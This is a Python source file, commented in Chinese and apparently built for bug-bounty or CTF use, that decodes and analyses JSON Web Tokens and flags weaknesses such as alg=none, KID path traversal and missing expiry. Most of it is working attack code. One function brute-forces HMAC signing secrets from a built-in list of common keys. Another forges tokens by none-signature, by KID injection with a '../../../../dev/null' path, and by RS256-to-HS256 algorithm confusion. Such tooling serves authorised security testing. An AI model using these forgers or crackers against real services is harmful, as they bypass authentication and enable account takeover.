"""JWT 解码/分析/攻击工具"""

import json
from typing import Optional

import jwt


def _b64decode(s: str) -> dict:
    """Base64 解码 JWT 段"""
    try:
        # 补全 padding
        s = s + "=" * (4 - len(s) % 4)
        import base64
        return json.loads(base64.urlsafe_b64decode(s))
    except Exception:
        return {}


async def bb_jwt_decode(token: str) -> str:
    """
    解码 JWT Token — 解析 Header/Payload（不验证签名）

    Args:
        token: JWT Token 字符串

    Returns:
        解码后的 Header 和 Payload
    """
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        parts = token.split(".")

        result = []
        result.append("=== JWT 解码结果 ===")
        result.append("")
        result.append(f"[Header]")
        result.append(f"  alg: {header.get('alg', 'N/A')}")
        result.append(f"  typ: {header.get('typ', 'N/A')}")
        result.append(f"  kid: {header.get('kid', 'N/A')}")
        for k, v in header.items():
            if k not in ('alg', 'typ', 'kid'):
                result.append(f"  {k}: {v}")

        result.append("")
        result.append(f"[Payload]")
        for k, v in payload.items():
            result.append(f"  {k}: {v}")

        # 安全检查
        result.append("")
        result.append("[安全检查]")
        alg = header.get("alg", "").lower()
        if alg == "none":
            result.append("  ⚠️ alg=none — 存在 None 签名攻击风险！")
        if "kid" in header:
            kid = header["kid"]
            if any(c in kid for c in ["../", "..\\", "/etc/", "file://"]):
                result.append("  ⚠️ KID 包含路径遍历字符 — 存在 KID 注入风险！")
            if kid in ("", "null", "0", "1", "true"):
                result.append("  ⚠️ KID 值可疑 — 可能存在注入风险")
        if payload.get("iat", 0) and payload.get("exp", 0):
            exp = payload["exp"]
            iat = payload["iat"]
            duration = exp - iat
            if duration > 86400 * 30:
                result.append(f"  ⚠️ Token 过期时间异常（{duration//86400} 天）")

        return "\n".join(result)
    except Exception as e:
        return f"[!] JWT 解码失败: {e}"


async def bb_jwt_analyze(token: str) -> str:
    """
    JWT 安全分析 — 包含解码 + 漏洞检测 + 攻击建议

    Args:
        token: JWT Token 字符串

    Returns:
        安全分析报告
    """
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
        alg = header.get("alg", "").lower()
    except Exception as e:
        return f"[!] JWT 分析失败: {e}"

    result = []
    result.append("=== JWT 安全分析报告 ===")
    result.append("")

    # 基础信息
    result.append(f"[基本信息]")
    result.append(f"  算法(alg): {alg}")
    result.append(f"  类型(typ): {header.get('typ', 'N/A')}")
    result.append(f"  签发者(iss): {payload.get('iss', 'N/A')}")
    result.append(f"  主题(sub): {payload.get('sub', 'N/A')}")
    result.append(f"  受众(aud): {payload.get('aud', 'N/A')}")
    result.append("")

    # 漏洞检测
    result.append("[漏洞检测]")
    vulns = []

    if alg == "none":
        vulns.append(("🔥 HIGH", "None 签名攻击", "alg=none，可绕过签名验证伪造任意 Token"))
    if alg == "hs256":
        vulns.append(("⚠️ MEDIUM", "弱密钥爆破", "HS256 对称算法，可尝试爆破密钥"))
    if alg in ("rs256", "rs384", "rs512") and "kid" in header:
        vulns.append(("⚠️ MEDIUM", "算法混淆可能", "RS256 + KID，尝试将 RS256 降级为 HS256"))
    if "kid" in header:
        kid = header["kid"]
        if "../" in kid or "..\\" in kid:
            vulns.append(("🔥 HIGH", "KID 路径遍历", f"KID 包含 '../'，可读取任意文件"))
        if kid == "" or kid.lower() == "none":
            vulns.append(("⚠️ MEDIUM", "KID 值空", "KID 为空，可能存在注入"))
    if "exp" not in payload:
        vulns.append(("⚠️ MEDIUM", "无过期时间", "Token 永不过期"))
    if "jti" not in payload:
        vulns.append(("ℹ️ LOW", "无 JWT ID", "缺少 jti 防重放"))

    if not vulns:
        result.append("  ✅ 未发现明显安全问题")
    else:
        for severity, name, desc in vulns:
            result.append(f"  {severity} {name}")
            result.append(f"       {desc}")

    result.append("")
    result.append("[攻击建议]")
    if "hs" in alg:
        result.append("  🔹 尝试暴力破解密钥: bb_jwt_crack(token=..., wordlist=[...])")
    if "rs" in alg:
        result.append("  🔹 尝试算法混淆: bb_jwt_attack(token=..., pubkey=...)")
    result.append("  🔹 尝试 None 签名: bb_jwt_attack(token=..., mode='none')")
    if "kid" in header:
        result.append("  🔹 尝试 KID 注入: bb_jwt_attack(token=..., mode='kid')")

    return "\n".join(result)


async def bb_jwt_crack(
    token: str,
    wordlist: str = "",
) -> str:
    """
    JWT 暴力破解 — 尝试破解 HMAC 密钥

    Args:
        token: JWT Token 字符串
        wordlist: 字典（逗号分隔），默认使用内置常见密钥

    Returns:
        破解结果
    """
    common_secrets = [
        "secret", "password", "admin", "key", "token", "jwt",
        "123456", "12345678", "qwerty", "test", "root", "flag",
        "secret_key", "secretkey", "SECRET", "SECRET_KEY", "PRIVATE_KEY",
        "changeme", "default", "pass", "123", "abc", "0000",
    ]

    if wordlist:
        words = [w.strip() for w in wordlist.split(",") if w.strip()]
    else:
        words = common_secrets

    result = []
    result.append(f"[*] JWT 密钥爆破 — 尝试 {len(words)} 个密钥")
    result.append("")

    try:
        header = jwt.get_unverified_header(token)
        alg = header.get("alg", "").lower()

        if "rs" in alg or "es" in alg or "ps" in alg:
            return "[!] 非对称算法无法爆破密钥，请尝试算法混淆攻击"

        if alg == "none":
            return "[!] 无签名算法(alg=none)，无需破解密钥"

        for secret in words:
            try:
                decoded = jwt.decode(token, key=secret, algorithms=[alg])
                result.append(f"[✓] 找到密钥: {secret}")
                for k, v in decoded.items():
                    result.append(f"    {k}: {v}")
                return "\n".join(result)
            except jwt.InvalidSignatureError:
                continue
            except Exception:
                continue

        result.append("[-] 未找到密钥，可尝试更大字典")
        return "\n".join(result)
    except Exception as e:
        return f"[!] 破解失败: {e}"


async def bb_jwt_attack(
    token: str,
    mode: str = "none",
    payload_override: Optional[str] = None,
    public_key: str = "",
) -> str:
    """
    JWT 攻击 — None签名 / KID注入 / 算法混淆

    Args:
        token: 原始 JWT Token
        mode: 攻击模式 (none / kid / algorithm_confusion)
        payload_override: 自定义 payload JSON（可选）
        public_key: 算法混淆所需公钥（PEM 格式）

    Returns:
        攻击生成的伪造 Token
    """
    try:
        header = jwt.get_unverified_header(token)
        orig_payload = jwt.decode(token, options={"verify_signature": False})
    except Exception as e:
        return f"[!] Token 解析失败: {e}"

    # 使用自定义 payload 或原 payload
    if payload_override:
        try:
            new_payload = json.loads(payload_override)
        except Exception:
            return "[!] payload_override 格式错误，需为 JSON 字符串"
    else:
        new_payload = dict(orig_payload)

    result = []
    result.append(f"[*] JWT 攻击模式: {mode}")
    result.append("")

    try:
        if mode == "none":
            # None 签名攻击
            forged = jwt.encode(new_payload, key="", algorithm="none")
            result.append("[✓] None 签名 Token 生成成功:")
            result.append(f"  {forged}")
            result.append("")
            result.append("[!] 将此 Token 替换原 Token 发送请求，验证是否绕过")

        elif mode == "kid":
            # KID 注入 — LFI
            forged_header = dict(header)
            forged_header["kid"] = "../../../../dev/null"
            forged = jwt.encode(
                new_payload,
                key="",
                algorithm=forged_header.get("alg", "HS256"),
                headers=forged_header,
            )
            result.append("[✓] KID 注入 Token:")
            result.append(f"  {forged}")
            result.append("")
            result.append("[!] 如果服务器使用 KID 值作为密钥文件路径")
            result.append("    尝试使用不同 kid 值读取文件:")

        elif mode == "algorithm_confusion":
            if not public_key:
                return "[!] 算法混淆攻击需要提供公钥（PEM 格式）"
            # 将 RS256 降级为 HS256，用公钥签名
            try:
                forged = jwt.encode(
                    new_payload,
                    key=public_key,
                    algorithm="HS256",
                )
                result.append("[✓] 算法混淆攻击 Token (RS256 → HS256):")
                result.append(f"  {forged}")
                result.append("")
                result.append("[!] 如果服务端使用公钥验证 HS256 签名，此 Token 会被接受")
            except Exception as e:
                result.append(f"[✗] 签名失败: {e}")

        else:
            return f"[!] 未知攻击模式: {mode}（可选: none / kid / algorithm_confusion）"

    except Exception as e:
        result.append(f"[✗] 攻击失败: {e}")

    return "\n".join(result)
